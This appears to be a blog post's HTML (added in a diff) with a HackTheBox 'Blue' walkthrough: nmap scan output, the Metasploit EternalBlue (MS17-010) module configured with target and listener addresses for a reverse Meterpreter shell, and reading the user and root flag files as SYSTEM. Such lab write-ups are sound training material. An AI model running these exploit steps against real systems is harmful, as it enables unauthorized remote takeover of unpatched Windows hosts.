@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox Blue | C:\Users\DcodeZero</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="HackTheBox Blue" />
+<meta name="author" content="jeevan" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Blue is a retired Windows machine that is rated as Easy on Hack the Box." />
+<meta property="og:description" content="Blue is a retired Windows machine that is rated as Easy on Hack the Box." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/retired/2020/03/10/Blue.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/retired/2020/03/10/Blue.html" />
+<meta property="og:site_name" content="C:\Users\DcodeZero" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-03-10T22:04:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox Blue" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"jeevan"},"dateModified":"2020-03-10T22:04:00+05:30","datePublished":"2020-03-10T22:04:00+05:30","description":"Blue is a retired Windows machine that is rated as Easy on Hack the Box.","headline":"HackTheBox Blue","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/retired/2020/03/10/Blue.html"},"url":"http://localhost:4000/hackthebox/retired/2020/03/10/Blue.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="C:\Users\DcodeZero" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">C:\Users\DcodeZero<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-red-hover" href="https://dcodezero.github.io/about/"><i class="fab fa-address-card"></i></a>
+        
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/Dcodezer0"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/DcodeZero"><i class="fab fa-github-square"></i></a>
+        
+        
+        
+        <a class="color-blue-hover" href="codedzero@gmail.com"><i class="fab fa-envelope"></i></a>
+        
+        
+        
+        <a class="color-grey-hover" href="https://app.hackthebox.com/profile/291968"><i class="fab fa-user"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+
+<img src="
+    /assets/avatar.png
+" class="author-avatar" alt="Avatar" />
+<div class="description">Hacker || Red Team || PenTester|| CTF Player || Blogger 
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">HackTheBox Blue</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/windows/">windows</a>
+      
+      <a class="tag" href="/tag/metasploit/">metasploit</a>
+      
+  </div>
+  
+  <div class="post-date">
+    Published on 10 Mar 2020
+    
+    by jeevan
+    
+  </div>
+  
+  <noscript>
+    <div class="post-description">Blue is a retired Windows machine that is rated as Easy on Hack the Box.</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h2 id="lets-get-started">Let’s get started</h2>
+
+<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    PORT      STATE SERVICE      VERSION
+    135/tcp   open  msrpc        Microsoft Windows RPC
+    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+    445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+    49152/tcp open  msrpc        Microsoft Windows RPC
+    49153/tcp open  msrpc        Microsoft Windows RPC
+    49154/tcp open  msrpc        Microsoft Windows RPC
+    49155/tcp open  msrpc        Microsoft Windows RPC
+    49156/tcp open  msrpc        Microsoft Windows RPC
+    49157/tcp open  msrpc        Microsoft Windows RPC
+    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+    Aggressive OS guesses: Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 8.1 (96%), Microsoft Windows 8.1 Update 1 (96%), Microsoft Windows Vista or Windows 7 SP1 (96%)
+    No exact OS matches for host (test conditions non-ideal).
+    Network Distance: 2 hops
+    Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+    Host script results:
+    |_clock-skew: mean: 1m33s, deviation: 1s, median: 1m32s
+    | smb-os-discovery: 
+    |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+    |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+    |   Computer name: haris-PC
+    |   NetBIOS computer name: HARIS-PC\x00
+    |   Workgroup: WORKGROUP\x00
+    |_  System time: 2020-03-08T16:52:23+00:00
+    | smb-security-mode: 
+    |   account_used: guest
+    |   authentication_level: user
+    |   challenge_response: supported
+    |_  message_signing: disabled (dangerous, but default)
+    | smb2-security-mode: 
+    |   2.02: 
+    |_    Message signing enabled but not required
+    | smb2-time: 
+    |   date: 2020-03-08T16:52:25
+    |_  start_date: 2020-03-08T16:46:59
+</code></pre></div></div>
+
+<blockquote>
+  <p>Wowww!!! There are a lot of open ports and I can see that it is a [Windows 7 Professional 7601 Service Pack 1]. 
+We can use many mays to hack into this machine, now I use metasploit to gain the shell of the machine.</p>
+</blockquote>
+
+<h2 id="metasploit">Metasploit</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    msf5 &gt; use  exploit/windows/smb/ms17_010_eternalblue
+    msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options
+
+    Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+    Name           Current Setting  Required  Description
+    ----           ---------------  --------  -----------
+    RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+    RPORT          445              yes       The target port (TCP)
+    SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+    SMBPass                         no        (Optional) The password for the specified username
+    SMBUser                         no        (Optional) The username to authenticate as
+    VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+    VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+    Exploit target:
+    Id  Name
+    --  ----
+    0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+    msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.10.40
+    rhosts =&gt; 10.10.10.40
+    msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 10.10.14.5
+    lhost =&gt; 10.10.14.5
+    msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set lport 4444
+    lport =&gt; 4444
+    msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit
+</code></pre></div></div>
+
+<p>After the exploit is successfully completed we get the [Meterpreter] shell…</p>
+
+<h2 id="getting-usertxt">Getting User.txt</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    C:\Users\haris&gt;cd Desktop
+    cd Desktop
+
+    C:\Users\haris\Desktop&gt;dir
+    dir
+    Volume in drive C has no label.
+    Volume Serial Number is A0EF-1911
+
+    Directory of C:\Users\haris\Desktop
+
+    24/12/2017  03:23    &lt;DIR&gt;          .
+    24/12/2017  03:23    &lt;DIR&gt;          ..
+    21/07/2017  07:54                32 user.txt
+                1 File(s)             32 bytes
+                2 Dir(s)  15,763,046,400 bytes free
+
+    C:\Users\haris\Desktop&gt;type user.txt
+    type user.txt
+    4c546aea7dbee75cbd71de245c8deea9
+</code></pre></div></div>
+
+<h2 id="getting-roottxt">Getting Root.txt</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    C:\Users\Administrator&gt;cd Desktop
+    cd Desktop
+
+    C:\Users\Administrator\Desktop&gt;dir
+    dir
+    Volume in drive C has no label.
+    Volume Serial Number is A0EF-1911
+
+    Directory of C:\Users\Administrator\Desktop
+
+    24/12/2017  03:22    &lt;DIR&gt;          .
+    24/12/2017  03:22    &lt;DIR&gt;          ..
+    21/07/2017  07:57                32 root.txt
+                1 File(s)             32 bytes
+                2 Dir(s)  15,753,887,744 bytes free
+
+    C:\Users\Administrator\Desktop&gt;type root.txt
+    type root.txt
+    ff548eb71e920ff6c08843ce9df4e717
+</code></pre></div></div>
+
+<h4 id="this-gives-us-a-reverse-shell-as-nt-authoritysystem-and-we-are-able-to-read-the-root-and-user-flags">This gives us a reverse shell as nt authority\system and we are able to read the root and user flags</h4>
+
+<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.</p>
+
+<p>My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/hackthebox/retired/2020/03/10/Blue.html';
+     this.page.identifier = '/hackthebox/retired/2020/03/10/Blue';
+     this.page.title = 'HackTheBox Blue';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//bitbrain-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/otherposts/2020/10/17/OSCP.html">
+            My  journey  towards  "TRY  HARDER!"
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hackthebox/retired/2020/07/23/Buff.html">
+            HackTheBox Buff
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hackthebox/retired/2020/07/11/Blackfield.html">
+            Hackthebox Blackfiled
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/oscp/" class="set-1">OSCP</a> <a href="/tag/tryharder/" class="set-1">TryHarder</a> <a href="/tag/activedirectory/" class="set-3">activedirectory</a> <a href="/tag/bloodhound/" class="set-1">bloodhound</a> <a href="/tag/bludit/" class="set-1">bludit</a> <a href="/tag/boot2root/" class="set-2">boot2root</a> <a href="/tag/crackmapexec/" class="set-1">crackmapexec</a> <a href="/tag/cve/" class="set-1">cve</a> <a href="/tag/dnspy/" class="set-1">dnspy</a> <a href="/tag/evilwinrm/" class="set-3">evilwinrm</a> <a href="/tag/gobuster/" class="set-4">gobuster</a> <a href="/tag/hashcat/" class="set-2">hashcat</a> <a href="/tag/impacket/" class="set-3">impacket</a> <a href="/tag/john/" class="set-1">john</a> <a href="/tag/ldapsearch/" class="set-1">ldapsearch</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/lsass/" class="set-1">lsass</a> <a href="/tag/lxd/" class="set-1">lxd</a> <a href="/tag/metasploit/" class="set-2">metasploit</a> <a href="/tag/mimikatz/" class="set-1">mimikatz</a> <a href="/tag/portforwarding/" class="set-1">portforwarding</a> <a href="/tag/rpcclient/" class="set-3">rpcclient</a> <a href="/tag/smb/" class="set-1">smb</a> <a href="/tag/tomcat/" class="set-1">tomcat</a> <a href="/tag/windows/" class="set-5">windows</a> <a href="/tag/wordpress/" class="set-1">wordpress</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'Blue is a retired Windows machine that is rated as Easy on Hack the Box.';
+  const speed = parseInt('70');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/DcodeZero/dcodezero.github.io">DcodeZero</a> theme for dcodezero by <a href="https://github.com/DcodeZero/dcodezero.github.io">dcodezero</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
